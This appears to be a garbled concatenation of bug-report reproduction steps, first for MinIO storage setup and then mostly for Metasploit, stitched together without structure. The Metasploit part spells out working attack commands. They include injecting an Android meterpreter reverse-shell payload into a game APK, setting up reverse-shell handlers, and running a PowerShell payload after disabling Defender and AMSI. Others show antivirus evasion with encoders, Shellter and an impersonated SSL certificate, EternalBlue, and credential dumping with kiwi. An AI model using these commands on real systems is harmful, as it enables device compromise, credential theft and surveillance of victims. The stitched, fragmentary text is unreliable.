created bucket sparkdata
tested with aws cli than i can list bucket and copy files to it
tested same with minio client
ran spark shell as per the article 8 just as an additional check set the policy to public
./minio server --config-dir /etc/minio \\ --address 127.0.0.1:$port \\ \\ \\ \\ 2
then this error happen
deploy minio on eks 1.6
port-forwarding of service to access the minio browser on localhost:9000
1.starting the server as,
set minio_access_key=minioadmin
set minio_secret_key=minioadmin
set minio_identity_openid_config_url=
set minio_identity_openid_client_id=843351d4-1080-11ea-aa20-271ecba3924a
minio server e:\\filepath
install go 1.14 and helm
clone gitpod repository `git clone `
start installing gitpod ```
# helm repo add charts.gitpod.io
# helm dep update
# helm upgrade --install $(for i in $(cat configuration.txt); do echo -e "-f $i"; done) gitpod .
not sure unfortunately
i tested it from my other node and it doesn't throw errors.
1.get a presigned put url
2.upload a zip file by the url
3.download the zip file
4.unzip the file
the file size is changed, and cannot unzip it in windows env, i can unzip it in linux env,but an error would occur: exit status 1
create an nfsv3 share and mount it
use this compose:
version: "3.3" services: minio: image: minio/minio container_name: minio environment: - "minio_access_key=minio" - "minio_secret_key=minio123" ports: - 9000:9000 volumes: - ./nfs:/data command: gateway nas /data
curl -v
< http/1.1 200 ok
< accept-ranges: bytes
< content-encoding:
< content-length: 12967
< content-security-policy: block-all-mixed-content
< content-type: image/svg+xml
< etag: "0b86a7a3eb0cfe9c46620087a80b606d-1"
< last-modified: fri, 01 may 2020 13:50:30 gmt
< server: minio/release.2020-03-05t01-04-19z
< vary: origin
< x-amz-request-id: 160aefda09bc1154
< x-xss-protection: 1; mode=block
< date: fri, 01 may 2020 15:05:38 gmt
for other types it seems ok:
curl -v
< http/1.1 200 ok
< accept-ranges: bytes
< content-length: 14727
< content-security-policy: block-all-mixed-content
< content-type: image/png
< etag: "db9430002464161a1b38a02885101545-1"
< last-modified: fri, 01 may 2020 15:02:30 gmt
< server: minio/release.2020-03-05t01-04-19z
< vary: origin
< x-amz-request-id: 160af0087175b2a3
< x-xss-protection: 1; mode=block
< date: fri, 01 may 2020 15:08:57 gmt
upload a .svg file to a minio instance
get the file
sample code:
output logs:
1.use postman to upload file
setup 3 hosts with 32 sata disk each;
minio server {4...6}/var/lib/minio/export{1...26} {4...6}/var/lib/minio/export{27...32}
lanch cosbench with 3 drivers which direct 3 minio servers and running upload case.
using minio client to push files to minio server
record the upload and download time.
upgrade minio version
retest using minio client to push files to minio server
record the upload and download time.
4.compare these file delivery time to see the performance has a degrade or not.
install minio from website to window 7.
set window environment variable minio_access_key = minio, minio_secret_key = minio1234.
startup minio with command c:\\development\\tools\\minio\\minio.exe server c:\\development\\obj-storage
minio server startup succesfully
go to browser to url able to access the page.
write a java client using aws sdk to access minio server
sample code as follow:
awscredentials credentials = new basicawscredentials("minio", "minio1234"); clientconfiguration clientconfiguration = new clientconfiguration(); clientconfiguration.setsigneroverride("awss3v4signertype"); amazons3 s3client = amazons3clientbuilder.standard() .withendpointconfiguration(new awsclientbuilder.endpointconfiguration(" ", null)) .withpathstyleaccessenabled(true) .withclientconfiguration(clientconfiguration) .withcredentials(new awsstaticcredentialsprovider(credentials)).build();
//the following line keep processing without error and never return response
list<bucket> buckets = s3client .listbuckets();
everytime we reboot the server, service is not coming back
have to manually start it.
version: "3.7"
services: keycloak: image: jboss/keycloak:9.0.2 ports: - 8080:8080 environment: keycloak_user: keycloak keycloak_password: keycloak123 healthcheck: test: ["cmd", "curl", "-f", " "] minio: image: minio/minio:release.2020-04-04t05-39-31z volumes: - minio-data:/data ports: - "9000:9000" environment: minio_access_key: minio minio_secret_key: minio123 minio_identity_openid_config_url: minio_identity_openid_client_id: account command: server /data healthcheck: test: ["cmd", "curl", "-f", " "] interval: 30s timeout: 20s retries: 3
volumes: minio-data:
docker-compose up logs:
minio_1 | api: system()
minio_1 | time: 08:34:17 utc 04/07/2020
minio_1 | deploymentid: 4dd1778a-729c-48c3-abf4-ef62169df723
minio_1 | error: unable to initialize openid: get eof
minio_1 | 7: github.com/minio/minio@/cmd/config-current.go:396:cmd.lookupconfigs()
minio_1 | 6: github.com/minio/minio@/cmd/config-current.go:572:cmd.loadconfig()
minio_1 | 5: github.com/minio/minio@/cmd/config.go:253:cmd.initconfig()
minio_1 | 4: github.com/minio/minio@/cmd/config.go:213:cmd.(*configsys).init()
minio_1 | 3: github.com/minio/minio@/cmd/server-main.go:246:cmd.initallsubsystems()
minio_1 | 2: github.com/minio/minio@/cmd/server-main.go:220:cmd.initsafemode()
minio_1 | 1: github.com/minio/minio@/cmd/server-main.go:447:cmd.servermain()
navigate to server started successfully without openid login 3
update docker-compose.yml to depend_on keycloak and add a 'wait_for' wrapper: download wait-for and put it in the same folder as docker-compose.yml
version: "3.7"
services: keycloak: image: jboss/keycloak:9.0.2 ports: - 8080:8080 environment: keycloak_user: keycloak keycloak_password: keycloak123 healthcheck: test: ["cmd", "curl", "-f", " "] minio: image: minio/minio:release.2020-04-04t05-39-31z depends_on: - keycloak volumes: - minio-data:/data - ./wait-for:/usr/local/bin/wait-for ports: - "9000:9000" environment: minio_access_key: minio minio_secret_key: minio123 minio_identity_openid_config_url: minio_identity_openid_client_id: account command: - wait-for - localhost:8081 - -- - server - /data healthcheck: test: ["cmd", "curl", "-f", " "] interval: 30s timeout: 20s retries: 3
volumes: minio-data:
``` results in the following error:
attaching to minio-wait_keycloak_1, minio-wait_minio_1
minio_1 | ait-for is not a minio sub-command
see inio --help .
minio-wait_minio_1 exited with code 1
just follow your instructions
the prerequisites in the beginning are pointing to the standalone
i am aiming to distributed, so i didn't follow these prerequisites.
set up a minio environment.
upload files to one bucket up to 416gb or more.
visit the bucket files via browser ui.
launch a 4-node distributed cluster
kill one node, wait for error messages from the other 3 nodes
rejoin the 4th node.
wait for messages.
1.export minio_access_key='y2phokqv00sdn7498s8w'
2.export minio_secret_key='hymytbeerolv5qzghnrzitqof'
3./usr/bin/minio server -c ./conf --quiet ./data1 &
4.cat /proc/{pid of minio}/environ | tr '\\0' '\ '
![github](
use the 3 yamls mentioned above on openshift v3.10
i'm running kali linux the error msfvenom -x among-us-2020.9.9-mod-techbigs.com.apk -p android/meterpreter/reverse_tcp lhost=112.133.251.31 lport=8080 -o test.apk
warn: unresolved or ambiguous specs during gem::specification.reset: reline (>= 0) available/installed versions of this gem: - 0.1.5 - 0.1.3
warn: clearing out unresolved specs
try 'gem cleanup <gem>'
please report a bug if this causes problems.
using apk template: among-us-2020.9.9-mod-techbigs.com.apk
[-] no platform was selected, choosing msf::module::platform::android from the payload
[-] no arch selected, selecting arch: dalvik from the payload
[*] creating signing key and keystore..
[*] decompiling original apk..
[*] decompiling payload apk..
[*] locating hook point..
[*] adding payload as package com.innersloth.spacemafia.vdcdo
[*] loading /tmp/d20201016-1650-1bw5pxf/original/smali/com/unity3d/player/unityplayeractivity.smali and injecting payload..
[*] poisoning the manifest with meterpreter permissions..
[*] adding <uses-permission android:name="android.permission.write_contacts"/>
[*] adding <uses-permission android:name="android.permission.write_settings"/>
[*] adding <uses-permission android:name="android.permission.camera"/>
[*] adding <uses-permission android:name="android.permission.receive_sms"/>
[*] adding <uses-permission android:name="android.permission.record_audio"/>
[*] adding <uses-permission android:name="android.permission.access_coarse_location"/>
[*] adding <uses-permission android:name="android.permission.record_audio"/>
[*] adding <uses-permission android:name="android.permission.change_wifi_state"/>
[*] adding <uses-permission android:name="android.permission.call_phone"/>
[*] adding <uses-permission android:name="android.permission.read_contacts"/>
[*] adding <uses-permission android:name="android.permission.write_external_storage"/>
[*] adding <uses-permission android:name="android.permission.access_wifi_state"/>
[*] adding <uses-permission android:name="android.permission.receive_boot_completed"/>
[*] adding <uses-permission android:name="android.permission.read_phone_state"/>
[*] adding <uses-permission android:name="android.permission.write_call_log"/>
[*] adding <uses-permission android:name="android.permission.set_wallpaper"/>
[*] adding <uses-permission android:name="android.permission.send_sms"/>
[*] adding <uses-permission android:name="android.permission.access_fine_location"/>
[*] adding <uses-permission android:name="android.permission.read_sms"/>
[*] adding <uses-permission android:name="android.permission.read_call_log"/>
[*] rebuilding apk with meterpreter injection as /tmp/d20201016-1650-1bw5pxf/output.apk
[-] i: using apktool 2.4.1-dirty
i: checking whether sources has changed...
i: smaling smali folder into classes.dex...
i: checking whether resources has changed...
i: building resources...
w: aapt: brut.common.brutexception: brut.common.brutexception: could not extract resource: /prebuilt/linux/aapt (defaulting to $path binary)
w: /tmp/d20201016-1650-1bw5pxf/original/androidmanifest.xml:2: error: no resource identifier found for attribute 'compilesdkversion' in package 'android'
w: /tmp/d20201016-1650-1bw5pxf/original/androidmanifest.xml:2: error: no resource identifier found for attribute 'compilesdkversioncodename' in package 'android'
w: /tmp/d20201016-1650-1bw5pxf/original/androidmanifest.xml:15: error: no resource identifier found for attribute 'appcomponentfactory' in package 'android'
brut.androlib.androlibexception: brut.common.brutexception: could not exec (exit code = 1): [aapt, p, --min-sdk-version, 19, --target-sdk-version, 30, --version-code, 123, --version-name, 2020.9.9, --no-version-vectors, -f, /tmp/apktool3348896667639207888.tmp, -0, resources.arsc, -0, png, -0, assets/bin/data/sharedassets0.resource, -0, assets/bin/data/sharedassets2.resource, -0, assets/bin/data/sharedassets4.resource, -0, arsc, -i, /home/tony/.local/share/apktool/framework/1.apk, -s, /tmp/d20201016-1650-1bw5pxf/original/res, -m, /tmp/d20201016-1650-1bw5pxf/original/androidmanifest.xml]
error: unable to rebuild apk with apktool ############### things i tried
sudo apt-get update
sudo apt-get upgrqde
making the tmp directory executable rsions.
use auxiliary/gather/enum_dns.rb
set ns 127.0.0.1
set enum_axfr true
set domain mytest.com
set enum_a false
set enum_brt false
set enum_mx false
set enum_soa false
set enum_srv false
set enum_txt false
set enum_cname false
set enum_ns false
run setup a zone transfer with an ns which is not the authoritative one for the domain
connect to windows machine with help of meterpreter
go to some dir with cyrilic file names and call ls
open msfconsole, ensure that you have `wordpress.jeff.thm` resolving to an ip
in my case i ran into this with the tryhackme jeff room: ```
features set rhost_http_url true
use exploit/unix/webapp/wp_admin_shell_upload
set rhost_http_url check
``` this outputs the following error:
[-] check failed: nomethoderror undefined method `split' for #<hash: >
msf6 exploit(unix/webapp/wp_admin_shell_upload) >
``` when setting the value: ```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost_http_url from: /home/kali/metasploit-framework/lib/msf/core/opt_http_rhost_url.rb:80 msf::opthttprhosturl#single_rhost?: 78: def single_rhost?(value) 79: require 'pry'; binding.pry => 80: return true if value =~ /[^-0-9,.*\\/]/ 81: walker = rex::socket::rangewalker.new(value) 82: return false unless walker.valid? 83: # if there is only a single ip then it's not a range 84: walker.length == 1 85: end [1] pry(#<msf::opthttprhosturl>)> value
=> " "
``` but when running the `check` method: ```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > check from: /home/kali/metasploit-framework/lib/msf/core/opt_http_rhost_url.rb:80 msf::opthttprhosturl#single_rhost?: 78: def single_rhost?(value) 79: require 'pry'; binding.pry => 80: return true if value =~ /[^-0-9,.*\\/]/ 81: walker = rex::socket::rangewalker.new(value) 82: return false unless walker.valid? 83: # if there is only a single ip then it's not a range 84: walker.length == 1 85: end [1] pry(#<msf::opthttprhosturl>)> value
=> " "
[2] pry(#<msf::opthttprhosturl>)> ``` which leads to the following error:
[-] check failed: nomethoderror undefined method `split' for #<hash: >
msf6 exploit(unix/webapp/wp_admin_shell_upload) >
sudo msfvenom -x earthslastheroesdefender.apk -p android/meterpreter/reverse_tcp lhost=(my ip) lport=5865 -o firstappearthshero.apk
run the following commands:
`msfconsole -q`
`use exploit/unix/webapp/wp_infinitewp_auth_bypass`
`set rhosts [redacted].com`
`set rport 443`
`set ssl true`
`set username [redacted]`
`set lhost [redacted]`
`set httptrace true`
root@hostname:~$ msfconsole metasploit park, system security interface version 4.0.5, alpha e ready..
> access security access: permission denied
> access security grid access: permission denied
> access main security grid access: permission denied....and..
you didn't say the magic word! you didn't say the magic word! you didn't say the magic word! you didn't say the magic word! you didn't say the magic word! you didn't say the magic word! you didn't say the magic word! =[ metasploit v6.0.10-dev- ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops ]
+ -- --=[ 7 evasion ] metasploit tip: view advanced module options with advanced msf6 > show options global options:
=============== option current setting description ------ --------------- ----------- consolelogging false log all console input and output loglevel 0 verbosity of logs (default 0, max 3) meterpreterprompt meterpreter the meterpreter prompt string minimumrank 0 the minimum rank of exploits that will run without explicit confirmation prompt msf6 the prompt string promptchar > the prompt character prompttimeformat %y-%m-%d %h:%m:%s format for timestamp escapes in prompts sessionlogging false log all input and output for sessions timestampoutput false prefix all console output with a timestamp msf6 > set prompt %t
prompt => %t
11:14:55 > show options global options:
=============== option current setting description ------ --------------- ----------- consolelogging false log all console input and output loglevel 0 verbosity of logs (default 0, max 3) meterpreterprompt meterpreter the meterpreter prompt string minimumrank 0 the minimum rank of exploits that will run without explicit confirmation prompt %t the prompt string promptchar > the prompt character prompttimeformat %y-%m-%d %h:%m:%s format for timestamp escapes in prompts sessionlogging false log all input and output for sessions timestampoutput false prefix all console output with a timestamp 11:15:00 > version
framework: 6.0.10-dev-
console : 6.0.10-dev-
have multiple running exploits in parallel, then try to kill 'runaway' exploits with `jobs -k` and it doesn't seem to kill the runaway jobs
running `jobs -k <jobnumber>` seems to work though
found this bug via a script i'm writing to make metasploit more autonomous.
generate a handler with: `msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_http; set lport 8080; set lhost 192.168.0.3; set exitonsession false; set exitfunc thread; run;"`
generate a payload with:
`msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.0.3 lport=8080 -f psh > payload.ps1`
run the payload from a powershell session with `ps z:\\> .\\payload.ps1` or from a cmd session with: `powershell.exe -executionpolicy bypass -noexit -file z:\\payload.ps1` i always get the following errors:
add-type : (0) : source file 'c:\\windows\\temp\\s2lyvsie.0.cs' could not be found
(1) : using system;
at z:\\payload.ps1:8 char:19
lzozdkskc = add-type -memberdefinition $bcofaooqmnyf -name "win32" -n ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + categoryinfo : invaliddata: (microsoft.power...pecompilererror:addt ypecompilererror) [add-type], exception + fullyqualifiederrorid : source_code_error,microsoft.powershell.commands.addt ypecommand warning: (0) : no source files specified (1) : using system;
add-type : cannot add type
compilation errors occurred.
at z:\\payload.ps1:8 char:19
lzozdkskc = add-type -memberdefinition $bcofaooqmnyf -name "win32" -n ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + categoryinfo : invaliddata: (:) [add-type], invalidoperationexcepti on + fullyqualifiederrorid : compiler_errors,microsoft.powershell.commands.addtyp ecommand you cannot call a method on a null-valued expression.
at z:\\payload.ps1:13 char:1
+ $tlrekgzhaycnutb = $yqmzglzozdkskc::virtualalloc(0,[math]::max($tkuyk ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + categoryinfo : invalidoperation: (:) [], runtimeexception + fullyqualifiederrorid : invokemethodonnull cannot find an overload for "copy" and the argument count: "4".
at z:\\payload.ps1:15 char:1
+ [system.runtime.interopservices.marshal]::copy($tkuykxeczto,0,$tlrekg ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + categoryinfo : notspecified: (:) [], methodexception + fullyqualifiederrorid : methodcountcouldnotfindbest you cannot call a method on a null-valued expression.
at z:\\payload.ps1:17 char:1
+ $yqmzglzozdkskc::createthread(0,0,$tlrekgzhaycnutb,0,0,0)
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + categoryinfo : invalidoperation: (:) [], runtimeexception + fullyqualifiederrorid : invokemethodonnull
## things i tried:
- of course i disabled defender and all its modules.
- both script logging and amsi were disabled with the commands in (for amsi i used the matt graebers reflection method)
- x86 and x64 payloads
- reverse_tcp and reverse_http payloads
- both staged and non-staged versions
- normal and elevated command prompts, as well as administrator and normal user sessions
- using binary formats (.exe) as well as psh-cmd work perfectly
also, the web-delivery method works as well, so i suspect it might have something to do with amsi, since the web-delivery bypasses it, but 1) its disabled and 2) the error message i get is different from the one you get when it detects the payload as malicious.
start a multi/handler at 127.0.0.1:4444 (we'll run the staged payload on the attacker host, for simplicity) ```
[justin@2a33356e3953 d /opt/metasploit-framework](r7_master/?1)% cat php_handler.rc
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 127.0.0.1
set lport 4444
set exitonsession false
exploit -j [justin@2a33356e3953 d /opt/metasploit-framework](r7_master/?1)% ./msfconsole -r php_handler.rc -q
[*] processing php_handler.rc for erb directives.
resource (php_handler.rc)> use exploit/multi/handler
[*] using configured payload generic/shell_reverse_tcp
resource (php_handler.rc)> set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
resource (php_handler.rc)> set lhost 127.0.0.1
lhost => 127.0.0.1
resource (php_handler.rc)> set lport 4444
lport => 4444
resource (php_handler.rc)> set exitonsession false
exitonsession => false
resource (php_handler.rc)> exploit -j
[*] exploit running as background job 0.
[*] exploit completed, but no session was created.
[*] starting persistent handler(s)..
[!] you are binding to a loopback address by setting lhost to 127.0.0.1
did you want reverselistenerbindaddress?
[*] started reverse tcp handler on 127.0.0.1:4444 ``` produce and execute a staged payload ```
[justin@2a33356e3953 d /tmp/tmp.ttaxvwgsex]% /opt/metasploit-framework/msfvenom -p php/meterpreter/reverse_tcp lhost=127.0.0.1 lport=4444 -o payload.php
[-] no platform was selected, choosing msf::module::platform::php from the payload
[-] no arch selected, selecting arch: php from the payload
no encoder specified, outputting raw payload
payload size: 1110 bytes
saved as: payload.php [justin@2a33356e3953 d /tmp/tmp.ttaxvwgsex]% php -v
php 7.3.19-1~deb10u1 (cli) (built: jul 5 2020 06:46:45) ( nts )
copyright (c) 1997-2018 the php group
zend engine v3.3.19, copyright (c) 1998-2018 zend technologies with zend opcache v7.3.19-1~deb10u1, copyright (c) 1999-2018, by zend technologies [justin@2a33356e3953 d /tmp/tmp.ttaxvwgsex]% php payload.php /* ``` meterpretersession1opened.gif ```
msf6 exploit(multi/handler) > [*] sending stage (39264 bytes) to 127.0.0.1
[*] meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:50812) at 2020-10-10 20:26:57 +1100 msf6 exploit(multi/handler) > sessions -i -1
[*] starting interaction with 1..
meterpreter > ``` getuid works ```
meterpreter > getuid
server username: justin (31337)
``` drop to a shell
run commands
get no output
meterpreter > shell
process 55970 created.
channel 0 created.
echo foo >&1
echo foo >&2
``` leaving the shell for a moment, take note that `/tmp/hello` doesn't exist on the host ```
[justin@2a33356e3953 d ~]% cat /tmp/hello
cat: /tmp/hello: no such file or directory
``` going back to our wonky `shell` channel, tell it to put something in `/tmp/hello` ```
echo "this command does actually run as $(id) on $(uname)" >> /tmp/hello
``` leaving the shell once more, note that the file did get created :exploding_head: ```
[justin@2a33356e3953 d ~]% cat /tmp/hello
this command does actually run as uid=31337(justin) gid=31337(justin) groups=31337(justin),27(sudo) on linux
$ msfconsole -v
framework version: 5.0.101-dev
linux kali 5.4.0-kali3-amd64 #1 smp debian 5.4.13-1kali1 (2020-01-20) x86_64 gnu/linux meterpreter > transport add -t reverse_http -l 192.168.1.14 -p 5555 -a "browser"
meterpreter > transport list
session expiry : @ 2020-10-16 11:48:00 id curr url comms t/o retry total retry wait -- ---- --- --------- ----------- ---------- 1 300 3600 10 2 * tcp://192.168.1.14:5555 300 3600 10 meterpreter > transport remove -t reverse_http -l 192.168.1.14 -p 5555 -u yzc2exzbfdhdynxhgubbuq0s8piuj4b_xvafzbenpy-584iutrx94yn_qx9gqwi_xsklo-_odc
[-] http/s transport specified without session uri
when i boot up kali linux in virtual box everything works properly till login
after login the screen is blank and it wont respond
this happens with any user including root this problem started after full upgrade of kali 2019.3 before that it was working
the disclosure date for the zentao_pro_rce module should likely be 2020-06-20 instead of 0020-06-20.
use auxiliary/gather/enum_dns.rb
set ns 127.0.0.1
set enum_axfr true
set domain mytest.com
set enum_a false
set enum_brt false
set enum_mx false
set enum_soa false
set enum_srv false
set enum_txt false
set enum_cname false
set enum_ns false
run basically, just do an axfr on its own.
use auxiliary/gather/enum_dns.rb
set ns 127.0.0.1
set enum_axfr true
set domain mytest.com
set enum_a false
set enum_brt false
set enum_mx false
set enum_soa false
set enum_srv false
set enum_txt false
set enum_cname false
set enum_ns false
run the local bind9 server is setup to allow zone transfers
the ip addresses in it aren't setup to point to anything valid, including the ns records.
run `./msfdb start` and ensure the database is up and running.
create a new workspace with `workspace -a appscan` or some name of your choice.
run `db_import ../qa/import_files/appscan.xml` (or point it to the location where `appscan.xml` is located on your disk).
observe that attempting to perform a database import of `appscan.xml` will cause the database to crash.
try this with `../qa/import_files/core2.xml` and `../qa/import_files/core1.xml` and not that they also cause the database to crash.
obtained zabbix server appliance fimage rom the following link:
started up the appliance images in virtualbox and ran the metasploit module against each appliance created.
input chinese
use back to delete i am using wsl version of kali
create scan report with openvas version 9 (now called gvm) in xml
open msfconsole
import xml with `db_import ~/xml_name.xml`
show exploits
start the json_rpc or msfdb rest service
call the json_rpc method or web_service method
can't connect db rsions.
launch image `metasploit-framework:latest` from dockerhub (metasploitframework/metasploit-framework), today=2020-09-20, image id = `0946d77f5dbd`
version = `6.0.8-dev`
run bash from within `msfconsole`
generate payload with `msfvenom` ```
./msfvenom --version
msfvenom: version unknown ./msfvenom -p windows/meterpreter/reverse_https \\ lhost=example.com lport=4444 \\ payloaduuidtracking=true payloaduuidname=emailcampaign20150101 \\ -f exe -o /data/payloads/payload.exe
`/home/msf/.msf4/payloads.json` is not created
touch /home/msf/.msf4/payloads.json
!./msfvenom
`~/.msf4/payloads.json` still empty 7
also tried other payloads such as `windows/meterpreter/reverse_tcp`, `windows/meterpreter/reverse_tcp_uuid`, stageless `windows/meterpreter_reverse_https`
it didn't change the behavior
also tried with option `payloaduuidseed`, didn't change the behavior
also tried on version `5.0.101-dev` which is packed in kali 2020.3 (from repo, up to date)
same behavior
also tried the command `generate` within `msfconsole`, by "using" the payload and setting the uuid tracking options
same behavior (payload generated, `~/.msf4/payloads.json` not created)
the payload is correctly generated though, but can't use uuid tracking
no error message during the payload generation.
`sudo msfupdate` today
`msfconsole` ``` =[ metasploit v6.0.7-dev- ]
+ -- --=[ 2061 exploits - 1119 auxiliary - 348 post ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops ]
+ -- --=[ 7 evasion ]
`msf6 > load wmap` ```
[wmap 1.5.1] === et [ ] metasploit.com 2012
[*] successfully loaded plugin: wmap
`msf6 > wmap_sites -l`
start msfconsole
search joomla type:exploit
set options
run yea, it failed and returned - error retrieving table prefix
install *metasploit framework 6.0.6* (i could reproduce it in *windows* and *linux*)
start the `msfconsole`
execute the following commands: ``` use windows/smb/ms08_067_netapi set payload windows/meterpreter/reverse_tcp set lhost 127.0.0.1 set rhost 127.0.0.1 run ``` * **note:** i don't use a victim/target because it isn't needed to reproduce the issue
i attacked the `loopback` ip address because i was using *ubuntu* without `samba` (so `127.0.0.1:445` wasn't bound)
maybe this isn't a good idea when the issue is fixed and you do have an smb server running on `0.0.0.0:445` (because you are in *windows* or you are using `samba`).
get an x64 system session on windows and load the `kiwi` extension
try to execute a custom command using `kiwi_cmd` (eg
`kiwi_cmd sekurlsa::logonpasswords full`)
the extension splits the two arguments into two separate commands rsions.
use snmp_login
selected the **windows/smb/ms17_010_eternalblue** exploit in msfconsole, filled out the parameters lhost, lport, rport, reverselistenerbindaddress and rhosts to my public ip, port 445 (which was open), port 445 again, my private ip and the ip of my virtual machine that was running an old version of windows 7
ran the exploit with the **exploit** command
- opened the lport and made lport the same as the rport
- set all the required parameters in show options
- made the target a vm on the same network as mine and check if it crashed (spoiler alert: it didn't)
- ran set timeout 999 to increase the timeout nb - it didn't change the timeout at all
- made sure there wasn't a single issue with my network that could stop it from working
none of the previous issue threads have helped.
create two workspaces with different services and then do a service search: 1
open `msfconsole` and connect a database
`hosts -a 127.0.0.1`
`services -a -s default_service -p 1234 127.0.0.1`
`workspace -a test`
`hosts -a 127.0.0.2`
`services -a -s test_service -p 1234 127.0.0.2`
`services -s service`
using msfrpc:
start msfrpcd:
> msfrpcd -p dummypass
log in using msfrpc:
> msfrpc -p dummypass -a 127.0.0.1
execute exploit: > rpc.call("module.execute", "exploit", "linux/http/goahead_ldpreload", {"rhosts" => "10.10.0.9"})
> {"job_id"=>nil, "uuid"=>"cmvcfaae"} ----
using msfconsole:
launch msfconsole:
> msfconsole
set up exploit:
> use exploit/multi/http/struts_dmi_exec 3
set parameters
> set rhosts 10.10.0.9
> [\\*] started reverse tcp handler on 10.10.20.3:4444 > [\\*] 10.10.0.9:8080 - uploading exploit to sutfmc.jar, and executing it
> [\\*] sending stage (58147 bytes) to 10.10.0.9 > [\\*] meterpreter session 2 opened (10.10.20.3:4444 -> 10.10.0.9:48734) at 2020-09-09 16:11:20 +0000 > meterpreter >
download the latest *windows* `*.msi` installer from * note: i reproduced it with `metasploit-framework-6.0.5+20200905152636-1rapid7-1-x64.msi` but it is likely to be present in any `metasploit-framework-6.0.5+*-1rapid7-1-x64.msi` installer
if possible, use a clean *windows* virtual machine (i reproduced it in *windows 10 enterprise, version 1903*)
install *metasploit framework* with the following commands in an **elevated** command line: ```bat powershell "add-mppreference -exclusionpath \'c:\\metasploit-framework\'" msiexec -i "metasploit-framework-6.0.5+20200905152636-1rapid7-1-x64.msi" /quiet /passive ```
launch the *metasploit framework* console ```bat c:\\metasploit-framework\\bin\\msfconsole.bat ``` note: no exploit nor victim host indicated sine this issue occurs early when starting the console.
i just create the payload and try it over wan
after im trying to put "ls" command
run `msfconsole` with ruby 2.5 or earlier
`use auxiliary/scanner/smb/smb_version`
`set rhosts ...`
set payload android/meterpreter/reverse_tcp
set lhost localhost
use multi/handler
download filepath my path rsions.
use multi/handler
set payload windows/x64/shell_reverse_tcp
setting up my ip and port
set autoloadstdapi true
set exitonsession false
set initialautorunscript 'post/multi/manage/shell_to_meterpreter'
exploit -j rsions.
windows 10 x64 version 18363
install latest nightly windows installer (mine v6.0.4 at the time)
waited 10-15 min but it give me error installer ended prematurely ## system stuff
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue_win8.py rsions
the problem is not on the victim machine but on the local machine
i don't know if you will be able to reproduce it, but i make an android backdoor, i test it on my phone, and after 20 seconds it says session closed
reason died
the only way to reproduce is just make an android reverse tcp
i will provide a screenshot so you can see what happens
download
attempt to install metasploit to `r:\\utilities\\`
use exploit/multi/fileformat/js_unpacker_eval_injection
setting up with my ip and default port and generic/shell_reverse_tcp payload
3.use multi/handler
4.setting up with my ip and default port and generic/shell_reverse_tcp payload
5.exploit -j
6.and execute the node js script in my windows 10 x64 7.and i type "sessions" and it output is like this : msf5 exploit(multi/handler) > sessions active sessions
=============== id name type information connection -- ---- ---- ----------- ---------- 1 shell sparc/bsd microsoft windows [version 10.0.18363.1016] (c) 2019 microsoft corporation
192.168.0.8:4444 -> 192.168.0.6:55129 (192.168.0.6)
8.and then i type "sessions -u 1" and the output is like this :
msf5 exploit(multi/handler) > sessions -u 1
[*] executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1] [*] upgrading session id: 1
[-] shells on the target platform, bsd, cannot be upgraded to meterpreter at this time
windows 10 x64 version 10.0.18363 build 18363
i impersonated a ssl cert using auxiliary/gather/impersonate_ssl:
`use auxiliary/gather/impersonate_ssl
set rhost www.github.com
i renamed and copied the .pem generated file to /root/desktop/test/
generated a raw payload with msfvenom:
`msfvenom -p windows/meterpreter/reverse_winhttps lhost=192.168.1.101 lport=4450 handlersslcert=/root/desktop/test/certificate.pem stagerverifysslcert=true -e x86/shikata_ga_nai -i 10 -f raw >/root/desktop/test/payload.raw
injected a stadalone executable program with my custom payload using shellter (auto operation mode)
the procedure was succesful and the standalone wasn't detected by the target's av(windows defender)
set up my handler in metasploit framework:
`use multi/handler
set payload windows/meterpreter/reverse_winhttps
set lhost=192.168.1.101
set lport 4450
set exitonsession false
set enablestageencoding true
set stageencoder x86/shikata_ga_nai
set handlersslcert /root/desktop/test/certificate.pem
set stagerverifysslcert true
exploit -j -z
ran the injected standalone on the target pc
got a meterpreter session
interacted with the session and ran "shell"
checked the handler on from google chrome browser and my certificate was untrusted as i got a promt asking me if i really want to visit the website.
immediately got shut down as windows defender detects the meterpreter connection.
used exploit/unix/webapp/wp_admin_shell_upload ( tested it with every available payload )
typed `run`
the exploitation goes well and generate a new meterpreter session
metasploit gets stuck 5
try with `ctrl+c` in order to exit from the session
get an error which tells that the exploit is interrupted by the user and failed
enter again in the session ( which is still alive and partially working )
able to access the target and use some common commands such as `ls` or `cat` but not able to use things like `shell` i was doing a ctf (mr robot ctf on tryhackme) and the target system was an ubuntu machine
in this case the user i was using didn't have all the permissions.
selected the **windows/smb/ms17_010_eternalblue** exploit in msfconsole, filled out the parameters lhost, lport, rport, reverselistenerbindaddress and rhosts to my public ip, port 445 (which was open), port 445 again, my private ip and the ip of my virtual machine that was running an old version of windows 7
ran the exploit with the **exploit** command
- opened the lport and made lport the same as the rport
- set all the required parameters in show options
- made the target a vm on the same network as mine and check if it crashed (spoiler alert: it didn't)
- ran set timeout 999 to increase the timeout nb - it didn't change the timeout at all
- made sure there wasn't a single issue with my network that could stop it from working
none of the previous issue threads have helped.
load msf console ``` =[ metasploit v6.0.2-dev- ]
+ -- --=[ 2054 exploits - 1109 auxiliary - 346 post ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops ]
